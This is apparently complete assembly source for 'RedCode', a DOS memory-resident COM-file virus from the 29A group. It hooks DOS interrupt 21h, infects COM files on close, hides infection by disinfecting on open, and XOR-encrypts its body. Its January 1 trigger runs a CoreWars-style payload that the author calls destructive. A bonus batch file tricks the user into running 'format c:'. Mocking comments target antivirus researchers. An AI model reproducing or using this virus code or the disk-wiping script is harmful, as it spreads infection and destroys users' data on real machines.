   ; ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±°
   ;±±±°                                                                    ±±±°
   ;±±°  Virus name:      RedCode                 ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ    ±±°
   ;±±°  Writer:          Wintermute/29A          ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ    ±±°
   ;±±°  Size:            Nah, not much            ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ    ±±°
   ;±±°  Origin:          Spain                   ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ    ±±°
   ;±±°  Finished:        When all was done       ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ    ±±°
   ;±±±°                                                                    ±±±°
   ; ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±°
   ;
   ;
   ;  For those  who  still  don't know  what  RedCode and CoreWars are, go and
   ; look for some webpage in  the net so  you'll  later understand the meaning
   ; and the reason  to be of this virus... otherwise you'll  feel like if  you
   ; were trying to understand chinese scripts :)
   ;
   ;  I started writing this virus to try to make a payload which came up to my
   ; mind one day  after one couple  kalimotxos ( wine+coke ) :*) and intensive
   ; Marilyn Manson  sessions... what  about a CoreWars game in your computer ?
   ; Imagine, two programs  which fight as in CoreWars, trying to make impossi-
   ; ble  to each other  to do  its next move and thus win the game... imagine,
   ; also, that this game takes place in the first sectors of your HD.
   ;
   ;  So that's the virus payload.
   ;
   ;  The payload is destructive ( because of obvious reasons, not just because
   ; now I like to destroy  computers  and that  stuff ). However, the user may
   ; skip any damage  and save  his data just  by not pressing 'enter' when the
   ; payload appears. By pressing the "G" key right now you will be able to see
   ; the NON-destructive version of the payload.
   ;
   ;  About the virus itself, it's  a 'lame TSR COM infector' which  infects on
   ; closing/disinfects on opening using SFTs; some kind  of 'joke virus', with
   ; some references to "near friends" in the code and in the comments ;-D
   ;
   ;
   ;    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                         Each time I look outside
   ;              my mother dies, I feel my back is changing shape
   ;                 When the worm consumes the boy it's never
   ;                             considered rape.
   ;                           When they get to you
   ;                      Prick your finger it is done...
   ;                    the moon has now eclipsed the sun...
   ;                     the angel has spread his wings...
   ;                   the time has come for better things...
   ;       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                             ( Marilyn Manson )
   ;
   ;

   assume cs:codigo,ds:codigo,es:codigo
   codigo  segment
   org    00h

   bufferpos       equ virus_end-offset buffer
   virus_size      equ virus_end-virus_start
   encrypt_size    equ encrend-encrstart
   virus_start     label byte

   realstart:

           call    delta_offset

   delta_offset:
           mov     si,sp
           mov     si,word ptr [si]
           sub     si,offset delta_offset

           call    non_copied

   encrstart:

           inc     sp
           inc     sp

           mov     ax,0bacah
           int     21h
           cmp     ax,0bacah
           jz      instalados

           mov     ax,cs           ; Oh, no, another Tsr routine !
           dec     ax
           mov     es,ax
           mov     bx,es:[3]
           sub     bx,((virus_size+15)/16)+1
           mov     ah,4ah          ; Come on, resize...
           push    ds
           pop     es
           int     21h
           mov     ah,48h         ; ( There's gotta be a place for me )
           mov     bx,((virus_size+15)/16)
           int     21h
           push    ax
           dec     ax
           mov     es,ax
           mov     word ptr es:[1],8   ; Typical residence routine with Dos
           pop     es                  ;routines and no low level ( let's be
           xor     di,di               ;simple :-PP )
           push    si
           lea     si,realstart+si
           push    cs
           pop     ds
           mov     cx,virus_size/2+3   ; Hey, memory, here I am
           rep     movsw
           pop     si

           push    es
           pop     ds

           mov     ax,3521h            ; Where are you, my love ?
           int     21h
           mov     ds:word ptr int21h,bx
           mov     ds:word ptr int21h+2,es
           lea     dx,Where_it_happens
           mov     ax,2521h            ; Come here ;)
           int     21h
           push    cs cs
           pop     ds es


   instalados:

           mov     di,100h                 ; Restore host
           push    di
           lea     si,[si+buffer]
           movsw
           movsw
           movsb
           ret

   pushed: dw      0

   push_regs:

           cli
           pop     cs:word ptr [pushed]
           pushf
           push    ax bx cx dx es ds bp di si
           push    cs:word ptr [pushed]
           sti
           ret

   pop_regs:

           cli
           pop     cs:word ptr [pushed]
           pop     si di bp ds es dx cx bx ax
           popf
           push    cs:word ptr [pushed]
           sti
           ret

   push_stuff:

           pop     cs:word ptr [pushed]
           push    word ptr es:[di+0dh]        ; Time
           push    word ptr es:[di+0fh]        ; Date
           push    word ptr es:[di+04h]        ; Sets attribs
           mov     byte ptr es:[di+04h],0
           mov     byte ptr es:[di+2],2        ; Opening
           push    cs:word ptr [pushed]
           ret

   get_sft:
           push    bx              ; We get file's Sft
           mov     ax,1220h
           int     2fh
           jc      nein
           xor     bx,bx
           mov     bl,byte ptr es:[di]
           mov     ax,1216h
           int     2fh
           clc
   nein:
           pop     bx
           ret

   set_int_24:
           pop     cs:word ptr [pushed]
           mov     ax,3524h
           call    callint21
           push    es bx
           mov     ah,25h
           push    ax cs
           pop     ds
           lea     dx,int24handler
           call    callint21
           push    cs:word ptr [pushed]
           ret


   where_it_happens:                   ; Main center ( int21h handler )
           cmp     ax,0bacah           ; La del coche se escribe con b :-P
           jz      check
           cmp     ah,03dh
           je      disinfect
           cmp     ax,06c00h
           je      disinfect
           cmp     ax,4b01h
           je      disinfect
           cmp     ah,03eh
           jnz     vamos_al_salto
           jmp     infect_file
   vamos_al_salto:
           jmp     salto

   check:
           call    push_regs
           mov     ah,02ah
           int     21h
           cmp     dx,0101h                ; 1st january. Why not ?
           jnz     dont_payl               ;  Japi niu yiar !
           jmp     do_payload
   dont_payl:
           call    pop_regs
           iret

   ;****************************************************************************
   ;                                DISINFECTION
   ;----------------------------------------------------------------------------

   disinfect:

           call    push_regs

           cmp     ax,6c00h
           jz      extended
           mov     si,dx
   extended:
           mov     di,ds

           call    set_int_24

           mov     ds,di               ; Opens the file that was going to
           mov     dx,si               ;be opened
           xor     cx,cx
           mov     ax,3d00h
           call    callint21
           jnc     vamos_bien
           jmp     fuera_delto
   vamos_bien:
           xchg    ax,bx

           call    get_sft
           jc      outta_jiar

           push    cs              ; Is it infected ?
           pop     ds
           mov     ah,3fh
           mov     cx,2
           lea     dx,buffer
           call    callint21
           cmp     word ptr ds:[buffer],05951h
           jnz     outta_jiar

           call    push_stuff

           ; Let's start disinfecting

           mov     ax,word ptr es:[di+11h]     ; File length
           push    ax
           sub     ax,bufferpos
           mov     word ptr es:[di+15h],ax     ; We point to the buffer
           mov     ah,3fh
           mov     cx,5h
           lea     dx,buffer                   ; 5 bytes read
           call    callint21

           mov     si,dx
           mov     cx,5h
   des_loop:                                   ; We decrypt em
           xor     ds:byte ptr[si],0feh
           inc     si
           loop    des_loop

           mov     word ptr es:[di+15h],0
           mov     ah,40h
           mov     cx,5h
           lea     dx,buffer
           call    callint21
           pop     ax
           sub     ax,virus_size
           mov     word ptr es:[di+15h],ax
           mov     ah,40h
           xor     cx,cx
           call    callint21


   rest_all:
           pop     ax                      ; Recovers attributes
           mov     byte ptr es:[di+4h],al

           mov     ax,5701h
           pop     dx                      ; Date
           pop     cx                      ; Time
           call    callint21

   outta_jiar:
           mov     ah,3eh
           call    callint21
   fuera_delto:
           pop     ax dx ds        ; Restore int24h
           call    callint21

           call    pop_regs
           jmp     salto

   ;****************************************************************************
   ;                                 INFECTION
   ;----------------------------------------------------------------------------

   infect_file:

           call    push_regs

           mov     si,bx
           call    set_int_24          ; Errors Int
           mov     bx,si

           call    get_sft             ; actual Sft
           jc      outta_jiar

           push    cs
           pop     ds

           call    push_stuff

   tira_palla:
           clc
           cmp     word ptr es:[di+29h],'MO'
           jnz     cerramos
           cmp     byte ptr es:[di+28h],'C'
           jnz     cerramos
           cmp     word ptr es:[di+11h],01388h
           jna     cerramos
           cmp     word ptr es:[di+11h],0ea60h
           ja      cerramos

           mov     word ptr es:[di+15h],0      ; Five first bytes
           mov     ah,3fh
           mov     cx,5
           lea     dx,buffer
           call    callint21
           cmp     word ptr ds:[buffer],'ZM'
           jz      cerramos
           cmp     word ptr ds:[buffer],'MZ'
           jz      cerramos
           cmp     word ptr ds:[buffer],05951h ; Are we there ?
           jz      cerramos


           mov     ax,word ptr es:[di+11h]
           mov     word ptr es:[di+15h],ax

           push    ax di
           call    aporesaguarra
           pop     di ax

           sub     ax,5
           mov     word ptr cs:[jmptous+1h],ax
           mov     word ptr es:[di+15h],0h

           mov     ah,40h
           lea     dx,entrada
           mov     cx,5
           call    callint21

   cerramos:

           jmp     rest_all

                   ;*********************************************
                   ;   PAYLOAD-PAYLOAD-PAYLOAD-PAYLOAD-PAYLOAD
                   ;*********************************************

   do_payload:

                mov     ax,0013h        ; Mode 13h
                int     10h

                mov     dx,09h          ; We write the first message about
                mov     bx,7h           ;redcode_something
                call    set_cursor
                push    cs
                pop     ds
                lea     si,text1
                call    write

                mov     ax,0a000h       ; We draw the complete screen; squares
                mov     ds,ax           ;of the game, blablabla ( this is done
                mov     bx,320*10+30    ;from here to the next comment )
                mov     si,bx

                mov     cx,51d
                push    bx

    block:
                push    cx bx si
                mov     cx,125d
    line:
                mov     word ptr ds:[bx],808h
                mov     byte ptr ds:[si],8h
                add     si,320d
                inc     bx
                inc     bx
                loop    line

                pop     si bx cx
                mov     ax,cx
                and     al,1

                jnz     not_this_time
                add     bx,320d*5d

    not_this_time:

                add     si,5d
                loop    block

                pop     bx
                mov     si,bx
                mov     cx,125d
    lados:

                mov     word ptr ds:[bx],0f0fh
                mov     word ptr ds:[bx+09C40h],0f0fh
                mov     byte ptr ds:[si],0fh
                mov     byte ptr ds:[si+250d],0fh
                add     si,320d
                inc     bx
                inc     bx
                loop    lados
                mov     byte ptr ds:[si+250d],0fh

                push    ds
                push    cs
                pop     ds
                mov     dx,1208h        ; Write the text about today's contest
                mov     bx,42h
                call    set_cursor
                lea     si,text2
                call    write

                mov     dx,1402h        ; We introduce the first warrior of
                call    set_cursor      ;this night
                mov     bx,36h
                lea     si,text3
                call    write

                mov     dl,12h          ; and...
                call    set_cursor
                mov     bx,42h
                lea     si,text4
                call    write

                mov     dl,17h          ; The second fighter !
                call    set_cursor
                mov     bx,2h
                lea     si,text5
                call    write

                pop     ds              ; A000
                xor     ax,ax
                mov     es,ax

                    ;*******************
                    ; Initial positions
                    ;*******************

                mov     al,byte ptr cs:[400h]   ; Gets coordinates
                cmp     al,248d
                jna     @nopasana
                mov     al,248d
    @nopasana:
                mov     byte ptr cs:[prim_xpos],al  ; for the first player
                mov     byte ptr cs:[prim_at_x],al
                push    ax
                mov     dl,byte ptr cs:[46ch]       ; Not the timer O:)
                and     dl,01fh
                cmp     dl,24d
                jna     @palante
                mov     dl,24d
    @palante:
                mov     byte ptr cs:[prim_ypos],dl
                mov     byte ptr cs:[prim_at_y],dl
                pop     ax
                mov     cx,09h          ; Colour
                call    trazar          ; We draw initial 1st fighter's position

    @x_pos_again:
                mov     al,byte ptr es:[46ch]   ; Same for the 2nd one
                cmp     al,248d
                ja      @x_pos_again
                cmp     byte ptr cs:[prim_xpos],al ;checking they aren't on the
                jz      @x_pos_again               ;same pos.
                mov     byte ptr cs:[seg_xpos],al
                mov     byte ptr cs:[atta_x2],al
                push    ax
    @y_pos_again:
                mov     al,byte ptr es:[46ch]
                and     al,01fh
                cmp     al,24d
                ja      @y_pos_again

                mov     dl,al
                cmp     byte ptr cs:[prim_ypos],al
                jz      @y_pos_again
                mov     byte ptr cs:[seg_ypos],al
                mov     byte ptr cs:[atta_y2],al
                pop     ax

                mov     cx,0ah                  ; Player's colour
                call    trazar

                inc     al
                cmp     al,248d
                jna     @bien
                sub     al,250d
                inc     dl
                cmp     dl,24d
                jna     @bien
                xor     dl,dl
    @bien:      mov     byte ptr cs:[Spe_posx],al
                mov     byte ptr cs:[Spe_posy],dl
                mov     cx,0ah
                call    trazar

                mov     ah,07h                  ; When user presses a key...
                int     21h                     ;fiesta starts !!!


            ;  AND THE GAME BEGINS... the warriors start fighting, placed each
            ; of them in a random sector... first, Big Butt Gass¢ will move.
            ; Later, Himmler Fewster will.


            ;                       Big Butt Gass¢
            ;                       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
            ;
            ;  Data: Big Butt Gass¢, also known as 'Babe', is a brave Yorkshire
            ; little pig whose only objective in this life is becoming a
            ; shepherd; he believes he is a sheepdog.
            ;
            ;  Albeit, in all his life trying to be a sheepdog, he has suffered
            ; much because of some sheeps that didn't understand his likes or
            ; why does he want to became a sheepdog
            ;
            ;  Sheeps didn't understand him, and told him things as " Hummm,
            ; why do we need a pig that only insults us and tells us that this
            ; or that kind of food is bad for us ? We prefer dogs !!! ". Or
            ; even worse, dogs themselves, insulting him and depressing him;
            ; cause of this, he had to go out from GRANJA.R34 :'''-(
            ;
            ;  But one day, Big Butt knew "Rata Grasienta", a good friend that
            ; had simpathy to Big; discovered him RedCode, a kickass game from
            ; which he could demonstrate he was someone ( or just sink into
            ; his bullshit... )
            ;
            ;  So, here he is, come on Gass¢ !
            ;
            ;  Listing: ( could be bigger, but... how big do you thing the
            ; brain of a pig is ? )
            ;
            ;
            ;  BEGIN Gronf.War  ( .Warrior )
            ;
            ;   dat -1
            ; > add #4 -1
            ;   mov -2 @-2
            ;   jmp -2
            ;


    movements:

                mov     al,byte ptr cs:[prim_at_x]  ; Big Butt Gass¢ moves
                mov     dl,byte ptr cs:[prim_at_y]
                add     al,4h
                cmp     al,248d
                jna     correcto
                sub     al,250d
                inc     dl
                cmp     dl,24d
                jna     correcto
                xor     dl,dl
    correcto:
                mov     byte ptr cs:[prim_at_x],al
                mov     byte ptr cs:[prim_at_y],dl
                mov     cx,36h
                call    trazar
                call    ne1destroyed      ; Checks if someone was destroyed


            ; Now it's Himmler Fewster's turn

            ;                       Himmler Fewster
            ;                       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
            ;
            ;   Our second warrior, was born from a FidoPet NC and a moderator
            ; whose secret vocation was beeing a Beverly Hills high level
            ; prostitute.
            ;
            ;   So, Fewster's familiar environment wasn't good at all, and
            ; his personality went into violence and so; so young, he started
            ; playing with swastikas and insulting all people of different
            ; races than his; all non-AVer people
            ;
            ;   Then, his problems began. He hated VXers and only had friends
            ; from the God chosen race, AVers, the race which at the judgement
            ; day would sit right ( or was it left ? ) of God
            ;
            ;   At last, he became moderator of a Fido echoarea, recommended
            ; by his father and some friends from his race; from there, he
            ; could establish terror and silence about viruses. It was
            ; wonderful: if someone liked viruses, he could just squash and
            ; silence his dirty mouth. Even, he could make that stupid
            ; non-AVers believe that viruses jump from diskette to diskette,
            ; that they were an alive problem... there were no limits, he got
            ; the POWER.
            ;
            ;   Albeit, there was a little problem, the last pitfall in Himmler
            ; Fewster's life; some FidoPet and Internet fools called "the
            ; PowerRangers" that attacked his ideas and defended ( oh, heresy! )
            ; that virus writers knew most about viruses than antivirus
            ; writers...
            ;
            ;   And... is there a better method than intelligence to attack
            ; them ? And... which method is better than a good RedCode to do it ?
            ; Bontchy, Fewster, and another AVer that had some problems to find
            ; the difference between F-potato chips and polymorphic engines,
            ; made the definitive warrior to attack...
            ;
            ;   Listing:
            ;
            ;   BEGIN VIRUS_INFO.WAR ( Written in Basic; although Gass¢'s
            ;  warrior is one sector long, this is two sectors long, cause
            ;  it's written in the AVers's secret megak00l superlanguage...
            ;  0f c0z, ZX Spectrum's Basic ! )
            ;
            ;
            ;   5 let a=initxpos
            ;   10 input " Who are you/virus attitude/will you obey me? ",a$
            ;   20 if a$<>"I'll be your slave" then 40
            ;   30 print " Whatever ": Rem blah
            ;   40 print " Position banned "
            ;   50 let a=a-1
            ;   60 goto 10
            ;

                mov     al,byte ptr cs:[atta_x2]  ; Big Butt Gass¢ moves
                mov     dl,byte ptr cs:[atta_y2]
                dec     al
                cmp     al,0ffh
                jnz     finiquita
                mov     al,248d
                dec     dl
                cmp     dl,0ffh
                jnz     finiquita
                mov     dl,024d
    finiquita:
                mov     byte ptr cs:[atta_x2],al
                mov     byte ptr cs:[atta_y2],dl
                mov     cx,2h
                call    trazar
                call    ne1destroyed


                mov     dx,3dah         ; Delay ( monitor retrace )
    del1:       in      al,dx
                test    al,8
                jne     del1
    del2:       in      al,dx
                test    al,8
                je      del2

                jmp     movements


                    ;******************
                    ; WRITING ROUTINES
                    ;******************

    set_cursor:                         ; Place cursor where told by the program
                mov     ah,2
                xor     bh,bh
                int     10h
                ret

    write:
                lodsb
                or      al,al
                je      finished
                mov     ah,0eh
                int     10h
                jmp     write

    finished:   ret

                    ;*************************
                    ; TRACE A POSITION SQUARE
                    ;*************************

    trazar:
                push    ax dx
                                        ; We've got X pos in Al, Y pos in Dl
                xor     dh,dh
                xor     ah,ah
                add     ax,31d          ; Now, we've got in bx the X
                xchg    bx,ax

                mov     ax,5d
                mul     dx
                add     ax,11d
                xchg    ax,dx
                mov     ax,320d
                mul     dx
                add     bx,ax


                mov     dl,cl
                mov     cl,4
                push    bx                  ;*
    @paint:
                mov     byte ptr ds:[bx],dl
                add     bx,320d
                loop    @paint
                pop     bx
                pop     dx ax


                ret

                ; ********** CHECK ************

    Ne1destroyed:                   ; Routine to check if some crap were put
                                                        ; on the players's
                cmp     byte ptr cs:[prim_xpos],al      ; positions
                jnz     not_gasso
                cmp     byte ptr cs:[prim_ypos],dl
                jnz     not_gasso
                jmp     gassodied
    not_gasso:
                cmp     byte ptr cs:[seg_xpos],al
                jnz     not_himmler
                cmp     byte ptr cs:[seg_ypos],dl
                jnz     not_himmler
                jmp     himmlerdied
    not_himmler:
                cmp     byte ptr cs:[Spe_posx],al
                jnz     not_himmler2nd
                cmp     byte ptr cs:[spe_posy],dl
                jnz     not_himmler2nd
                jmp     himmlerdied
    not_himmler2nd:
                ret

    gassodied:  lea     si, himmler
                mov     bx,2h
                jmp     himmlermid
    himmlerdied:lea     si, gasso
                mov     bx,36h
    himmlermid: push    cs
                pop     ds

                mov     dx,0701h
                call    set_cursor
                call    write
                jmp     $


                ; ********** DATA **********

    Spe_posx:   db  0                  ; First zone is for the payload
    Spe_posy:   db  0
    prim_xpos:  db  0
    prim_ypos:  db  0
    prim_at_x:  db  0
    prim_at_y:  db  0
    seg_xpos:   db  0
    seg_ypos:   db  0
    atta_x2:    db  0
    atta_y2:    db  0
    text1:      db  'Viral RedCode Implant',0
    text2:      db  'Today''s contest between',0
    text3:      db  'Big Butt Gasso',0
    text4:      db  'and',0
    text5:      db  'Himmler Fewster',0
    gasso:      db  'BIIIIIIG BUTT GASSSOOOO... WINSSSSS !!!',0
    himmler:    db  'FEWSTER BANSSSSS GASSSSOOOOOOOO !!!',0

   entrada:        db 51h,59h
   jmptous:        db 0e9h,?,?
   buffer:         db 51h,59h,90h,0cdh,20h
   its_name:       db 'The RedCode virus by Wintermute/29A; yeah, not a kickass '
                   db 'at all, but with a funny payload, don''t you agree ?',0
                   db 'Watch the payload !'
   encrend         label   byte

   salto:          db      0eah
   int21h:         dw      0,0

   callint21:      pushf
                   call    dword ptr cs:[int21h]
                   ret

   int24handler:
                   mov     al,3
                   iret

   aporesaguarra:
                   xor     si,si
                   call    encrypt
                   push    cs
                   pop     ds
                   xor     dx,dx
                   mov     cx,virus_size
                   mov     ah,40h
                   call    callint21
                   call    encrypt
                   ret

   encrypt:
                   lea     di,encrstart+si
                   mov     cx,encrypt_size
   xor_loop:       xor     byte ptr cs:[di],0feh
                   inc     di
                   loop    xor_loop
                   ret


   virus_end       label byte

   non_copied:
           mov     word ptr encrstart-2+si, encrypt-encrstart
           ret


   codigo ends
   end realstart


   ;   BonusTrack
   ;   ÄÄÄÄÄÄÄÄÄÄ
   ;
   ;  And finishing this, I wanted to give an oportunity to my friend Christian;
   ; the oportunity of publishing a virus in this place of 29A: I told him, I can
   ; publish your virus in 29A ! And so I do, returning to my master in virus
   ; writing all I debt him, giving him my most sincerely thanks for being my
   ; master in viruswriting, the light that iluminated the way on my first steps
   ; making a Com non-tsr and that has brought me to the vast knowledge with his
   ; impressive wisdom.
   ;
   ;  Here it is, his most important creation; works under Win95/NT ( suppose ),
   ; Ms-dos, Win3.1 in an Ms-dos window, and I dunno if Linux and Os/2 have
   ; that kind of windows, but... 100% destructive, of course. Doesn't have
   ; polymorphism cause it doesn't need it, and it's stealth "after-execution",
   ; autodesinfecting itself when run. Here you are...
   ;
   ;
   ; === Cut INSTALL.BAT ===
   ;
   ; echo off
   ; :main
   ; cls
   ; echo.
   ; echo.
   ; echo   Beware !!!!!!, this is a virus. Your Personal Computer has been
   ; echo  infected by Cyberkurdt's sublime virus, PCVIRUS; the first spanish
   ; echo  virus completely made on EDIT, compatible within Dos, Windows, Win95,
   ; echo  and maybe in a DOS OS2 Window...
   ; echo   This virus presents some characteristics as multiple encryption,
   ; echo  some loop, /\/\egak00l interrups access, kewl&kickass formatting and
   ; echo  and self-disinfection.
   ; pause
   ; goto loop
   ;
   ; :encrypt
   ; Encryption
   ; a=!     b="     c=%     d=&     e=)     f=?     g:¨     h="     i=&
   ; j=/     k=^     l=ù     m=ù     n=€     ¤="     o=!     p=ú     q=%
   ; r=&     s=R     t=I     u=:     v=;     w=¥     x=>     y=<     z=ª
   ;
   ; €!ú)/!&!R($)%$=%ú=$)ú$)"ú"!=ú"=ú"?!ú=!?$^P^!"ú/(ú$/"ú"ú#@||\$/$($($(")ú"!ú)
   ; %(&ú$)%"=$ú!"=$!"?ú!"ú=ú")$ú(%$$ú/I%%&%&/$%$ú%("$"ú($)"!ú)!"ú=!"ú")$"(ú$(")
   ; ª#@#@|#@#@|@###@##%)$)%$ú¥^*ù¥:;;>;Z>::Zú>ùZ#>X>Z<zx'<zx0<>X:>Z>Xz@<0x<z
   ; !¦"ú$%&/()=?¨**ù_`+ï¤‡ï‡¤-.ï..,.,-,.m,m-.,-m.-.----------------------------
   ; goto end
   ;
   ; :routine
   ; goto loop2
   ;
   ; :loop
   ; goto routine
   ;
   ; :pepe
   ; cls
   ; choice /C:ns Press "y" and you will save your Personal Computer, press "n"
   ; and you won't see the light of day...
   ; if errorlevel 2 goto destruct
   ; cls
   ; echo   You're safe ! Yeah !, but..... are you sure that strange BAT isn't
   ; echo  another hyper-super-destructive virii ?
   ; echo.
   ; echo.
   ; pause
   ; goto end
   ;
   ; :loop2
   ; goto pepe
   ;
   ; :destruct
   ; cls
   ; echo  Ohhhh... shit, guy, you screwed it up; doesn't matter what you type
   ; echo now, the data on your hard disk is going to die... whatever, press
   ; echo "yes" and you will see a k00l porn animation :))''
   ; pause
   ; cls
   ; format c:
   ;
   ; goto end
   ;
   ; :end
   ; cls
   ; echo.
   ; echo.
   ; echo.
   ; echo.
   ; echo.
   ; echo.
   ; echo.
   ; echo.
   ; prompt Divided by Zero; Multiplied by Zero dot two; press Ctrl+Alt+Del
   ;
   ;
   ; === Cut ===
